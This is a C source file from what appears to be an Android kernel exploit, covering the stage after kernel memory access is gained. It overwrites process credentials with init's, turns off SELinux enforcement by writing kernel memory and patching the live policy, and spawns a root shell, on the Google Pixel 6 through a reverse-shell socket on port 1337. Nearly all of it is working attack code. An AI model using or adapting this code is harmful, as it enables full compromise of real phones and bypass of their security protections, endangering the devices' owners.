#define _GNU_SOURCE
#include "sepolicy.h"
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/prctl.h>
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <arpa/inet.h>
#include "util.h"
#include "uao.h"
#include "kernel_constants.h"
#include "rw.h"
#include "light_cond.h"


int disable_selinux_using_enforce() {
    if (getuid() != 0) {
        LOG("Not root, cannot disable SELinux\n");
        return -1;
    }
    int enforce_fd = SYSCHK(open("/sys/fs/selinux/enforce", O_RDWR));
    assert(SYSCHK(write(enforce_fd, "0\n", 3)) == 3);
    return 0;
}

int set_selinux_state_enforce(struct rw_info *rw, int enforce) {
    LOG("Setting selinux_state->enforce to %d\n", enforce);
    enforce = !!enforce;
    u64 selinux_state = kallsyms_lookup_name(rw, "selinux_state");
    if (selinux_state == 0) {
        LOG("failed to find selinux_state\n");
        return -1;
    }
    kwrite32(rw, selinux_state, (kread32(rw, selinux_state) & ~0xff) | enforce);
    u64 status_page = kread64(rw, selinux_state+0x10);
    u64 status_page_virt = page_to_virt(status_page);
    LOG("\tstatus page = %016lx\n", status_page);
    LOG("\tstatus page virt = %016lx\n", status_page_virt);
    kwrite32(rw, status_page_virt+8, enforce);
    LOG("\tDone\n");
    return 0;
}

u64 get_init_cred(struct rw_info *rw) {
    struct task_info init_task;
    LOG("Finding init cred\n");
    if (!find_task_struct_by_pid_tid(rw, 1, -1, &init_task)) {
        return 0;
    }
    LOG("\tinit task_struct = %016lx\n", init_task.task_struct);
    u64 init_cred = kread64(rw, init_task.task_struct + OFFCHK(dev_config->kconsts.task_struct_offsets.ts_cred));
    u32 init_cred_usage = kread32(rw, init_cred);
    LOG("\tinit cred = %016lx (usage %d)\n", init_cred, init_cred_usage);
    init_cred_usage = 0x100;
    kwrite32(rw, init_cred, init_cred_usage);
    return init_cred;
}

// returns old task cred
u64 switch_creds(struct rw_info *rw, pid_t pid, pid_t tid, u64 new_cred) {
    struct task_info task;
    bool success;
    u64 task_cred;

    LOG("Switch %d:%d to new creds (%016lx)\n", pid, tid, new_cred);
    success = find_task_struct_by_pid_tid(rw, pid, tid, &task);
    if (!success) {
        LOG("failed to find task_struct (%d:%d)\n", pid, tid);
        return 0;
    }

    task_cred = kread64(rw, task.task_struct + OFFCHK(dev_config->kconsts.task_struct_offsets.ts_cred));
    LOG("\ttask_struct (%d:%d) = %016lx  cred = %016lx\n", pid, tid, task.task_struct, task_cred);

    LOG("\tChange cred and real_cred\n");
    kwrite64(rw, task.task_struct + OFFCHK(dev_config->kconsts.task_struct_offsets.ts_cred), new_cred);
    kwrite64(rw, task.task_struct + OFFCHK(dev_config->kconsts.task_struct_offsets.ts_cred) - 8, new_cred);
    LOG("\tDone\n");
    return task_cred;
}

u64 switch_creds_to_init(struct rw_info *rw, pid_t pid, pid_t tid) {
    static u64 init_cred = 0;
    if (!init_cred) {
        init_cred = get_init_cred(rw);
    }
    return switch_creds(rw, pid, tid, init_cred);
}

struct tmp_shared {
    light_cond_t lc_disable_selinux_pend;
};


int pixel6_escalate(struct rw_info *rw) {
    pid_t pid;
    struct tmp_shared *ps;
    ps = mmap(NULL, sizeof(struct tmp_shared), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (ps == MAP_FAILED) {
        return -1;
    }

    light_cond_init_shared(&ps->lc_disable_selinux_pend);

    pid = fork();
    if (pid == 0) {
        for (int i = 0; i < 1024; i++) {
            close(i);
        }
        light_cond_wait(&ps->lc_disable_selinux_pend);
        exit(disable_selinux_using_enforce());
    }
    switch_creds_to_init(rw, pid, -1);

    set_selinux_state_enforce(rw, 0);
    u64 curr_cred = switch_creds_to_init(rw, getpid(), gettid());
    if (curr_cred == 0) {
        LOG("failed to switch creds to init\n");
        return -1;
    }

    /*
     * We now patch the live selinux policy to include a new rule,
     * allowing us to use the setenforce mechanism from the init
     * context. (We need to do this to _properly_ disable selinux
     * on the device, letting all user-space components know that
     * we disabled selinux so they can flush any internal cache
     * they have.)
     * 
     * The following code lines are the in-memory equivalent of 
     * these manual operations:
     * First, create new policy from unrooted device with:
     * 1. adb pull /sys/fs/selinux/policy policy.bin
     * 2. adb push magiskpolicy policy.bin /data/local/tmp
     * 3. adb shell 'cd /data/local/tmp; ./magiskpolicy --load ./policy.bin --save ./new_policy.bin "allow init kernel security setenforce"'
     * 4. (Optional) adb pull /data/local/tmp/new_policy.bin
     * 5. (Optional) "sesearch -A -s init -t kernel -c security new_policy.bin" should allow setenforce
     * 6. adb shell rm /data/local/tmp/magiskpolicy /data/local/tmp/policy.bin
     * 
     * Then, load the new policy with:
     * system("/vendor/bin/load_policy /data/local/tmp/new_policy.bin");
     */
    LOGD("[x] Reading live selinux policy\n");
    load_policydb("/sys/fs/selinux/policy");
    sepol_allow("init", "kernel", "security", "setenforce");
    dump_policydb("/sys/fs/selinux/load");
    LOGD("[x] New selinux policy loaded\n");

    switch_creds(rw, getpid(), gettid(), curr_cred);
    set_selinux_state_enforce(rw, 1);

    light_cond_broadcast(&ps->lc_disable_selinux_pend);
    waitpid(pid, NULL, 0);

    switch_creds_to_init(rw, getpid(), gettid());

    munmap(ps, sizeof(struct tmp_shared));

    return 0;
}

#define FULL_SELINUX_DISABLE
#define REVERSE_SHELL

#ifdef REVERSE_SHELL
int connect_to(const char *ip, int port) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    assert(inet_pton(AF_INET, ip, &addr.sin_addr) == 1);

    int sock = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));

    int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret == -1)
        return ret;

    return sock;
}
#endif

int pixel6_root(struct rw_info *rw) {
    int ret;
#ifdef FULL_SELINUX_DISABLE
    ret = pixel6_escalate(rw);
    LOG("escalate exit status = %d\n", ret);
    if (ret) {
        return ret;
    }
#else
    set_selinux_state_enforce(rw, 0);
    switch_creds_to_init(rw, getpid(), gettid());
#endif

    LOG("Reset process state\n");
    rw->kclose(rw);

#ifdef REVERSE_SHELL
    /* You can test by issuing "adb reverse tcp:1337 tcp:1337" 
     * and starting a server on your host on port 1337.
     */
    int sock = connect_to("127.0.0.1", 1337);
    if (sock == -1) {
        LOG("Could not open socket connection\n");
        return 0;
    }
#endif

    LOG("Spawning root shell\n");

#ifdef REVERSE_SHELL
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
#endif

    char *envp[] = {"PATH=/sbin:/system/sbin:/product/bin:/apex/com.android.runtime/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin", "ANDROID_DATA=/data", "HOSTNAME=!!!PWNED!!!", NULL};
    execle("/bin/sh", "/bin/sh", NULL, envp);
    /* Unreachable. */
    return 0;
}

int root(struct rw_info *rw) {
    LOG("\n[x] Success! Time to root\n");

    if (is_device("Google Pixel 6")) {
        return pixel6_root(rw);
    }

    LOG("[x] Prove that we succeeded by overwriting uname\n");
    u64 init_uts_ns = kallsyms_lookup_name(rw, "init_uts_ns");
    if (init_uts_ns != 0) {
        char new_uname[64];
        sprintf(new_uname, "Ninja::%016lx", rw->ki.pipe_buffer_page);

        dev_config->kconsts.kernel_offsets.k_init_uts_ns = OFFSET(init_uts_ns-rw->ki.kernel_base);
        kwrite(rw, rw->ki.kernel_base + OFFCHK(dev_config->kconsts.kernel_offsets.k_init_uts_ns) + 4, 
                    new_uname, strlen(new_uname) + 1);
    }

    return 0;
}